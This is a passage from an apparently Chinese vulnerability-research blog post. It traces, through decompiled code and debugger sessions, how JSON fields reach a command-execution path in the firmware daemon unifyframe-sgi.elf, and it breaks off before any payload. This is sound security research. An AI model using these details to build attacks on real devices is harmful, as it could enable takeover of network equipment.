*((_BYTE *)a1 + <span class="number">40</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v37 = json_object_new_boolean(*((<span class="type">unsigned</span> __int8 *)a1 + <span class="number">41</span>) ^ <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v37 )</span><br><span class="line">          json_object_object_add(v20, <span class="string">&quot;async&quot;</span>, v37);</span><br><span class="line">      &#125;</span><br><span class="line">      v38 = (_BYTE *)a1[<span class="number">3</span>];</span><br><span class="line">      <span class="keyword">if</span> ( !v38 || !*v38 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_78;</span><br><span class="line">      v39 = json_object_new_string(v38);</span><br><span class="line">      json_object_object_add(v20, <span class="string">&quot;data&quot;</span>, v39);</span><br><span class="line">LABEL_78:</span><br><span class="line">      v41 = (_BYTE *)a1[<span class="number">4</span>];</span><br><span class="line">      <span class="keyword">if</span> ( v41 &amp;&amp; *v41 )</span><br><span class="line">      &#123;</span><br><span class="line">        v42 = json_object_new_string(v41);</span><br><span class="line">        <span class="keyword">if</span> ( !v42 )</span><br><span class="line">        &#123;</span><br><span class="line">          json_object_put(v20);</span><br><span class="line">          json_object_put(v5);</span><br><span class="line">          v40 = <span class="number">630</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_82;</span><br><span class="line">        &#125;</span><br><span class="line">        json_object_object_add(v20, <span class="string">&quot;device&quot;</span>, v42);</span><br><span class="line">      &#125;</span><br><span class="line">      json_object_object_add(v5, <span class="string">&quot;params&quot;</span>, v20);<span class="comment">//将上面的v20当做了params的值，向v5中添加新的键值对</span></span><br><span class="line">      v43 = json_object_to_json_string(v5);<span class="comment">//json_object_to_json_string作用是将JSON对象转换为JSON格式的字符串</span></span><br><span class="line">......</span><br><span class="line">      v44 = uf_socket_client_init(<span class="number">0</span>);</span><br><span class="line">......</span><br><span class="line">      v50 = <span class="built_in">strlen</span>(v43);</span><br><span class="line">      uf_socket_msg_write(v44, v43, v50);<span class="comment">//最终调用uf_socket_msg_write，用socket实现了进程间通信，将解析好的json数据发送给其他进程进行处理</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>既然存在 <code>uf_socket_msg_write</code> 进行数据发送，那么肯定就在一个地方在用 <code>uf_socket_msg_read</code> 函数进行数据的接收，用 <code>grep</code> 进行字符串搜索，发现 <code>/usr/sbin/unifyframe-sgi.elf</code> 文件，并且该文件还位于 <code>/etc/init.d</code> 目录下，这意味着该进程最初就会启动并一直存在，所以判断出这个 <code>unifyframe-sgi.elf</code> 文件就是用来接收 <code>libunifyframe.so</code> 文件所发送过来的数据</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308241513060.png" alt="image-20230822145039327"></p>
<h2 id="二进制文件分析"><a href="#二进制文件分析" class="headerlink" title="二进制文件分析"></a>二进制文件分析</h2><p>为了总结 <code>/usr/sbin/unifyframe-sgi.elf</code> 文件中调用链，同时梳理清几个线程和信号量的关系，我画了整体的调用流程图，接下来会分析下图所示的所有函数</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308311122302.png" alt="image-20230831112201027"></p>
<h3 id="读取数据"><a href="#读取数据" class="headerlink" title="读取数据"></a>读取数据</h3><p>从 <code>/usr/sbin/unifyframe-sgi.elf</code> 文件中 <code>main</code> 函数里的 <code>uf_socket_msg_read</code> 函数开始分析（这里是该文件接收数据的最初位置，从这里开始追踪数据会比较明朗，如果单纯的从 <code>main</code> 函数逐行分析，思维会很乱）。<code>uf_socket_msg_read(*v29, v31 + 1)</code> 该函数的第一个参数是文件描述符，第二个参数是接收数据存储的位置（具体定义可以查看 <code>/usr/lib/libunifyframe.so</code> 文件）</p>
<p>下面两张图片为调试 <code>uf_socket_msg_read</code> 函数执行前后的状态</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291338524.png" alt="image-20230829133810198"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291342074.png" alt="image-20230829134227731"></p>
<p>有趣的地方在于很多字段我们没有设置，但上图能看到这些字段依然存在（只不过值是空的字符串），这意味着在数据传输过来之前有地方设置了这些字段</p>
<p>之后 <strong>解析字段</strong>、<strong>执行具体操作</strong> 的两个函数分别为 <code>parse_content</code> <code>add_pkg_cmd2_task</code> （均位于 <code>main</code> 函数），如下图</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291344320.png" alt="image-20230829134431234"></p>
<h3 id="解析数据"><a href="#解析数据" class="headerlink" title="解析数据"></a>解析数据</h3><p>下图为调试到 <code>parse_content</code> 函数执行前的状态，发现参数是一个结构体地址，其存储了一些地址和数据。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291349507.png" alt="image-20230829134935230"></p>
<p>下面对 <code>parse_content</code> 函数进行分析（具体分析已标在注释中）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">parse_content</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">......</span><br><span class="line">  v3 = *(_DWORD *)(a1 + <span class="number">4</span>);</span><br><span class="line">  v4 = <span class="number">598</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">  v5 = json_tokener_parse(v3, a2);</span><br><span class="line">  v6 = v5;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(v5, <span class="string">&quot;params&quot;</span>, &amp;v20) != <span class="number">1</span> )<span class="comment">//检查了params字段是否存在值，不存在的话直接返回-1</span></span><br><span class="line">    <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(v20, <span class="string">&quot;device&quot;</span>, &amp;v19) == <span class="number">1</span> &amp;&amp; json_object_get_type(v19) == <span class="number">6</span> )<span class="comment">//检查了是否存在device字段是否存在值以及类型是否为string  这里的判断失败也不会返回-1，意味着这个字段是非必须的</span></span><br><span class="line">  &#123;</span><br><span class="line">    v8 = (<span class="type">const</span> <span class="type">char</span> *)json_object_get_string(v19);</span><br><span class="line">......</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(v6, <span class="string">&quot;method&quot;</span>, &amp;v21) != <span class="number">1</span> )<span class="comment">//method字段也必须要存在</span></span><br><span class="line">  &#123;</span><br><span class="line">LABEL_31:</span><br><span class="line">    json_object_put(v6);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = json_object_get_string(v21);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v9, <span class="string">&quot;cmdArr&quot;</span>) )<span class="comment">//method的值不为cmdArr的话，进入else</span></span><br><span class="line">  &#123;</span><br><span class="line">......   </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">......</span><br><span class="line">    v17 = parse_obj2_cmd(v6, v8);<span class="comment">//进行数据解析的具体位置,v6为json对象</span></span><br><span class="line">    *v16 = v17;</span><br><span class="line">    <span class="keyword">if</span> ( !v17 )</span><br><span class="line">    &#123;</span><br><span class="line">......</span><br><span class="line">    &#125;</span><br><span class="line">    pkg_add_cmd(a1, v16);</span><br><span class="line">    v16[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  json_object_put(v6);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>根据上面的分析可知，具体进行数据解析的位置应该是 <code>parse_obj2_cmd</code> 函数，该函数具体分析如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">parse_obj2_cmd</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  v3 = <span class="built_in">malloc</span>(<span class="number">52</span>);<span class="comment">//创建了一个堆块，用于记录和存储接下来的各种信息，该函数最终会返回这个堆块地址</span></span><br><span class="line">  v5 = v3;</span><br><span class="line">......</span><br><span class="line">  <span class="built_in">memset</span>(v3, <span class="number">0</span>, <span class="number">52</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a2 )</span><br><span class="line">    *(_DWORD *)(v5 + <span class="number">16</span>) = strdup(a2);</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(a1, <span class="string">&quot;module&quot;</span>, &amp;v46) != <span class="number">1</span></span><br><span class="line">    || (v6 = json_object_get_string(v46), (v7 = v6) == <span class="number">0</span>)</span><br><span class="line">    || <span class="built_in">strcmp</span>(v6, <span class="string">&quot;esw&quot;</span>) )<span class="comment">//检查module字段是否存在，存在的话值是否为字符串esw，如果这两个条件有一个不满足，则进入if</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( json_object_object_get_ex(a1, <span class="string">&quot;method&quot;</span>, &amp;v46) != <span class="number">1</span> )<span class="comment">//解析method字段</span></span><br><span class="line">    &#123;</span><br><span class="line">......</span><br><span class="line">    &#125;</span><br><span class="line">    v16 = json_object_get_string(v46);<span class="comment">//获取到method的值，下面去匹配对应的操作，各种操作都对应一个数字，该数字放在了堆块的第一个指针处</span></span><br><span class="line">    v17 = v16;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v16, <span class="string">&quot;devSta&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v18 = <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v17, <span class="string">&quot;acConfig&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        *(_DWORD *)v5 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_50;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v17, <span class="string">&quot;devConfig&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        *(_DWORD *)v5 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_50;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v17, <span class="string">&quot;devCap&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v18 = <span class="number">3</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(v17, <span class="string">&quot;ufSys&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">...... </span><br><span class="line">        &#125;</span><br><span class="line">        v18 = <span class="number">4</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_DWORD *)v5 = v18;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_50;</span><br><span class="line">  &#125;</span><br><span class="line">......<span class="comment">//此处省略了大部分代码，做的事情依然是字段解析，然后写入内存，就不逐一分析了</span></span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(v47, <span class="string">&quot;data&quot;</span>, &amp;v46) == <span class="number">1</span> &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)(json_object_get_type(v46) - <span class="number">4</span>) &lt; <span class="number">3</span> )<span class="comment">//判断params字段中是否存在data，如果存在的话将其赋值给v37，并且检查了data的值类型，只能为object,array,string三种类型，然后将data的值放到堆块的第四个指针处  注意：报文中我并没有设置data字段，但是接收的数据在写入内存之前就被自动添加了data字段</span></span><br><span class="line">  &#123;</span><br><span class="line">    v43 = json_object_get_string(v46);</span><br><span class="line">    <span class="keyword">if</span> ( v43 )</span><br><span class="line">    &#123;</span><br><span class="line">      v44 = strdup(v43);</span><br><span class="line">      *(_DWORD *)(v5 + <span class="number">12</span>) = v44;</span><br><span class="line">      <span class="keyword">if</span> ( !v44 )</span><br><span class="line">      &#123;</span><br><span class="line">        v9 = <span class="number">561</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_136;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v42;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解析后各字段的值如下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291430860.png" alt="image-20230829143032518"></p>
<p><code>parse_obj2_cmd</code> 函数结束后，会执行 <code>pkg_add_cmd(a1, v16)</code> ，它的核心作用就是在 <code>a1</code> 这个数据结构中记录了 <code>v16</code> 的指针，使得后续操作通过 <code>a1</code> 访问到刚刚解析出来的各个字段。不过这 <code>pkg_add_cmd</code> 函数里有一个谜之操作，在这行代码中 <code>*(_DWORD *)(a1 + 92) = a2 + 13</code> 是把 <code>a2</code> 也就是 <code>v16</code> 的值加上了 <code>13</code> 存储到了 <code>a1</code> 中，而通过后续的分析得知，之后访问这个 <code>v16</code> 的堆块是通过 <code>*(a1+92)-13</code> 得到的地址。存的时候 <code>+13</code> ，访问的时候 <code>-13</code> ，这里没太理解但并不影响我们后续的分析</p>
<h3 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h3><h4 id="操作关键信号量"><a href="#操作关键信号量" class="headerlink" title="操作关键信号量"></a>操作关键信号量</h4><p>解析完成后，直接看 <code>add_pkg_cmd2_task</code> 函数的调试界面，发现参数传入的还是执行 <code>parse_content</code> 函数那个结构体地址</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291436977.png" alt="image-20230829143659670"></p>
<p>对 <code>add_pkg_cmd2_task</code> 函数进行分析</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">add_pkg_cmd2_task</span><span class="params">(_DWORD *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( dword_435ECC &lt; <span class="number">1001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    pthread_mutex_lock(*a1 + <span class="number">20</span>);</span><br><span class="line">    v3 = (_DWORD *)a1[<span class="number">22</span>];</span><br><span class="line">    v4 = v3 - <span class="number">13</span>;<span class="comment">//当时存地址时加了13，这里又减了13，所以v4就是上面记录了解析json各字段的那个堆块地址</span></span><br><span class="line">    <span class="keyword">for</span> ( i = *v3 - <span class="number">52</span>; ; i = *(_DWORD *)(i + <span class="number">52</span>) - <span class="number">52</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 + <span class="number">13</span> == a1 + <span class="number">22</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        pthread_mutex_unlock(*a1 + <span class="number">20</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v6 = <span class="built_in">malloc</span>(<span class="number">20</span>);</span><br><span class="line">      v7 = (<span class="type">int</span> *)v6;</span><br><span class="line">......</span><br><span class="line">      v10 = v6 + <span class="number">4</span>;</span><br><span class="line">      v7[<span class="number">2</span>] = v10;</span><br><span class="line">      v7[<span class="number">1</span>] = v10;</span><br><span class="line">      *v7 = (<span class="type">int</span>)v4;</span><br><span class="line">      v7[<span class="number">4</span>] = (<span class="type">int</span>)(v7 + <span class="number">3</span>);</span><br><span class="line">      v7[<span class="number">3</span>] = (<span class="type">int</span>)(v7 + <span class="number">3</span>);</span><br><span class="line">......</span><br><span class="line">      *v7 = (<span class="type">int</span>)v4;</span><br><span class="line">      v11 = (_DWORD *)*v4;</span><br><span class="line">      v12 = *(_DWORD *)*v4;</span><br><span class="line">      <span class="keyword">if</span> ( v12 == <span class="number">3</span> )<span class="comment">//这里判断v12就是前面解析method的值，因为发送的是merge（实际传入的就是devSta.set） 所以v12最终在前面被解析成了2</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v12 == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        gettimeofday(v4 + <span class="number">5</span>, <span class="number">0</span>);</span><br><span class="line">        uf_sys_handle(*(_DWORD **)*v7, v4 + <span class="number">1</span>);</span><br><span class="line">LABEL_22:</span><br><span class="line">        gettimeofday(v4 + <span class="number">7</span>, <span class="number">0</span>);</span><br><span class="line">        sub_40B644(v7);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v12 == <span class="number">2</span> &amp;&amp; !<span class="built_in">strcmp</span>(v11[<span class="number">1</span>], <span class="string">&quot;get&quot;</span>) &amp;&amp; !v11[<span class="number">9</span>] &amp;&amp; uf_cmd_buf_exist_check(v11[<span class="number">2</span>], <span class="number">2</span>, v11[<span class="number">3</span>], v4 + <span class="number">1</span>) )<span class="comment">//虽然v12为2了，但我们的字符串是set，并不是get，所以这个if还是进不去</span></span><br><span class="line">      &#123;</span><br><span class="line">        *(_DWORD *)(*v7 + <span class="number">44</span>) = <span class="number">1</span>;</span><br><span class="line">        sub_40B644(v7);</span><br><span class="line">        v8 = *v7;</span><br><span class="line">        v9 = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      &#125;</span><br><span class="line">      sub_40B304((<span class="type">int</span> **)v7);<span class="comment">// devSta.set这个字段的话 前面的if都进不去，会触发这里的sub_40B304函数</span></span><br><span class="line">LABEL_23:</span><br><span class="line">      v4 = (<span class="type">int</span> *)i;</span><br><span class="line">    &#125;</span><br><span class="line">......</span><br><span class="line">  &#125;</span><br><span class="line">  v1 = <span class="number">-1</span>;</span><br><span class="line">......</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><code>sub_40B304</code> 函数最关键的作用就是过渡到 <code>sub_40B0B0</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291500311.png" alt="image-20230829145958320"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_40B304</span><span class="params">(<span class="type">int</span> **a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  v2 = **a1;</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)v2 == <span class="number">5</span> )<span class="comment">//根据上图信息得知v2应该是2，这个if进不去</span></span><br><span class="line">  &#123;</span><br><span class="line">LABEL_2:</span><br><span class="line">    *(_BYTE *)(v2 + <span class="number">48</span>) = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( byte_435EC9 )<span class="comment">//这里是硬编码的1</span></span><br><span class="line">    &#123;</span><br><span class="line">      v3 = a1;</span><br><span class="line">      v4 = (<span class="type">int</span> (__fastcall *)(<span class="type">int</span> **))sub_40B0B0;<span class="comment">//将sub_40B0B0函数指针赋值给v4</span></span><br><span class="line">      <span class="keyword">return</span> v4(v3);<span class="comment">//此处IDA显示有些问题，其实执行的并不是这里的v4(v3)</span></span><br><span class="line">    &#125;</span><br><span class="line">LABEL_28:</span><br><span class="line">    v3 = a1;</span><br><span class="line">    v4 = sub_40B168;</span><br><span class="line">    <span class="keyword">return</span> v4(v3);<span class="comment">//上面的函数指针赋值给v4，最后调用的其实是这里的v4(v3)  调试一下就能看出来</span></span><br><span class="line">  &#125;</span><br><span class="line">  v5 = *(<span class="type">const</span> <span class="type">char</span> **)(v2 + <span class="number">20</span>);<span class="comment">//这里v2+20其实为remoteIp字段，因为在lua处理的时候，加上了remoteIp字段（意思是remoteIp字段有值，值为空。并非是remoteIp字段为空），所以这个v5是一个地址，指向了一个空的字符串而已（如果之前没有地方帮我们添加remoteIp字段的话，还需要自己传入一个remoteIp进来）</span></span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = is_self_ip(v5);<span class="comment">//传入一个指向空字符串的地址，返回值为0</span></span><br><span class="line">    v7 = *a1;</span><br><span class="line">    <span class="keyword">if</span> ( !v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = *v7;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_2;<span class="comment">//执行到此处进行跳转</span></span><br><span class="line">    &#125;</span><br><span class="line">    v7[<span class="number">11</span>] = <span class="number">3</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><code>sub_40B0B0</code> 函数中对关键的信号量进行了操作</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_40B0B0</span><span class="params">(_DWORD *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v2; <span class="comment">// $v1</span></span><br><span class="line">  _DWORD *v3; <span class="comment">// $v1</span></span><br><span class="line">  ++dword_435ECC;</span><br><span class="line">  pthread_mutex_lock(&amp;unk_435E74);</span><br><span class="line">  v2 = (_DWORD *)dword_435DC4;</span><br><span class="line">  a1[<span class="number">3</span>] = &amp;cmd_task_run_head;</span><br><span class="line">  dword_435DC4 = (<span class="type">int</span>)(a1 + <span class="number">3</span>);</span><br><span class="line">  a1[<span class="number">4</span>] = v2;</span><br><span class="line">  *v2 = a1 + <span class="number">3</span>;</span><br><span class="line">  v3 = (_DWORD *)dword_435DB4;</span><br><span class="line">  a1[<span class="number">2</span>] = dword_435DB4;</span><br><span class="line">  dword_435DB4 = (<span class="type">int</span>)(a1 + <span class="number">1</span>);</span><br><span class="line">  a1[<span class="number">1</span>] = &amp;cmd_task_remote_head;</span><br><span class="line">  *v3 = a1 + <span class="number">1</span>;</span><br><span class="line">  pthread_mutex_unlock(&amp;unk_435E74);</span><br><span class="line">  sem_post(&amp;unk_435E90);<span class="comment">//该函数最关键的部分就是此处sem_post对信号量unk_435E90操作</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>在 <code>uf_task_remote_pop_queue</code> 函数中的 <code>sem_wait(&amp;unk_435E90)</code> 本身是卡住了当前线程，而 <code>sub_40B0B0</code> 这里对信号量操作一触发，<code>deal_remote_config_handle</code> 函数就可以继续运行了，<code>uf_task_remote_pop_queue</code> 函数结束，随后就调用了关键的 <code>uf_cmd_call</code> 函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">deal_remote_config_handle</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  v1 = pthread_self();</span><br><span class="line">  pthread_detach(v1);</span><br><span class="line">  pthread_setcanceltype(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  prctl(<span class="number">15</span>, <span class="string">&quot;remote_config_handle&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(a1 + <span class="number">16</span>) = <span class="number">0</span>;</span><br><span class="line">      v3 = uf_task_remote_pop_queue();</span><br><span class="line">      *(_DWORD *)(a1 + <span class="number">16</span>) = v3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !v3 );</span><br><span class="line">......</span><br><span class="line">    v5 = uf_cmd_call(*v4, v4 + <span class="number">1</span>);<span class="comment">//关键函数</span></span><br><span class="line">......</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="从uf-cmd-call函数开始"><a href="#从uf-cmd-call函数开始" class="headerlink" title="从uf_cmd_call函数开始"></a>从uf_cmd_call函数开始</h4><p>在 <code>uf_cmd_call</code> 函数执行的地方打上断点，<code>c</code> 过来之后是如下界面，此时输入命令 <code>set scheduler-locking on</code> 将线程锁定（避免后续调试时，在各个线程中下的断点跳来跳去，之后只调试这一个线程）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291617137.png" alt="image-20230829161715801"></p>
<p>由于 <code>uf_cmd_call</code> 函数的代码量太长了，这里就不再出示相关代码，只调试和描述几个关键点</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291632275.png" alt="image-20230829163240216"></p>
<p>首先做了 <code>if</code> 判断，检查操作类型，因为我们这里是 <code>devSta</code> 为 <code>2</code>，所以这个 <code>if</code> 进不去（调试界面如下图）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291631518.png" alt="image-20230829163146277"></p>
<p>上面的 <code>if</code> 出来后，就会做这里的判断，这里的 <code>v2</code> 是 <code>devSta.set</code> 中的 <code>set</code> 部分，<code>uf_ex_cmd_type</code> 数组里装了各种操作的字符串例如 <code>set</code> <code>get</code> 之类的，数组里第一个元素就是 <code>set</code>，所以这个 <code>while</code> 进不去</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291701815.png" alt="image-20230829170100754"></p>
<p>调试界面如下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291711972.png" alt="image-20230829171103707"></p>
<p>后面的执行流转折点为 <code>if(!v16)</code> 这里</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291723184.png" alt="image-20230829172302135"></p>
<p>这个 <code>a1+45</code> 的位置当时解析的时候有一个标志位（如下图），但这个 <code>from_url</code> 并没有特别设置，所以这里就为 <code>0</code> ，导致进入了 <code>if(!v16)</code> ，执行跳转语句 <code>goto LABEL_86</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291724142.png" alt="image-20230829172452094"></p>
<p>&#96;</p>
<p><code>if ( !v103[20] )</code> 位置的判断，这里的 <code>v103[20]</code> 其实就是 <code>data</code> 字段的值</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291641637.png" alt="image-20230829164105564"></p>
<p>调试界面如下，因为 <code>！v103[20]</code> 为 <code>FALSE</code> ，所以这个 <code>if</code> 进不去</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308291644044.png" alt="image-20230829164439766"></p>
<p>在 <code> if ( !v103[7] )</code> 位置做了判断，调试可知 <code>v103[7]</code> 为 <code>2</code> ，因此 <code>if</code> 这里进不去，随后直接触发 <code>goto LABEL_174</code> 和 <code>goto LABEL_175</code>  </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308300959950.png" alt="image-20230830095922837"></p>
<p>从 <code>goto LABEL_175</code> 继续往下分析，在 <code>416</code> 的位置 <code>if</code> 进不去，然后通过调试 <code>435</code> 行这里的 <code>if</code> 可以进来</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308301007797.png" alt="image-20230830100751735"></p>
<p>在 <code>438</code> 行做的检查，判断了偏移 <code>48</code> 的位置是否为 <code>1</code> ，回顾字段解析的位置可以发现，我们是可以控制这里的值为 <code>1</code> 的（满足下图的条件即可）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308301020203.png" alt="image-20230830102023155"></p>
<p>但我没控制这个字段，调试过来发现偏移 <code>48</code> 的位置仍然是 <code>1</code> ，可能是之前某处代码设置了这个位置的值（调试界面如下图），总之这个 <code>if</code> 进不去</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308301025970.png" alt="image-20230830102517726"></p>
<p>由于上面的 <code>if</code> 进不去，那么出来之后直接到了 <code>489</code> 行的位置，此时已经能看到接下来必定会触发 <code>ufm_handle</code> 函数（<code>v103</code> 指向了 <code>uf_cmd_call</code> 函数的参数 <code>a1</code> ，也就是上文一直提到的存储解析字段的结构体）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308301028645.png" alt="image-20230830102817582"></p>
<h4 id="命令执行前夕"><a href="#命令执行前夕" class="headerlink" title="命令执行前夕"></a>命令执行前夕</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">ufm_handle</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  v2 = *(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">8</span>);</span><br><span class="line">  v4 = *(_DWORD *)(a1 + <span class="number">20</span>);</span><br><span class="line">  v5 = *(_DWORD *)(a1 + <span class="number">56</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v2 || !*v2 )<span class="comment">//这里是*(a1+8) 为0，并不是(int)(*a1)+8  开始分析的时候我以为这里检查的是module字段</span></span><br><span class="line">    <span class="keyword">goto</span> LABEL_185;<span class="comment">//这里会跳转</span></span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( remote_call(*(_DWORD **)a1, (<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">88</span>)) == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_185:</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v5, <span class="string">&quot;group_change&quot;</span>) || !<span class="built_in">strcmp</span>(v5, <span class="string">&quot;network&quot;</span>) || 